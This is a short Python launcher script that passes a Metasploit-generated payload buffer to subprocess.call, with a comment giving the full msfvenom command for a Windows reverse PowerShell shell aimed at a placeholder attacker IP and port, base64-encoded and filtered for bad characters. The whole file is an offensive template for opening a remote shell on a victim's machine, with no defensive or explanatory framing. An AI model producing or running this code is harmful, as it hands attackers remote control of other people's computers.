import subprocess

buf =  ""
# Put output of msfvenom payload here!


def get_buff():
    return buf


def main():
    subprocess.call(get_buff())


if __name__ == '__main__':
    main()


'''
msfvenom -p cmd/windows/reverse_powershell LHOST="<attackeripaddress>" LPORT="####" EXITFUNC=thread -b '\x00\xff' --encoder cmd/powershell_base64 -i 2 -f py
'''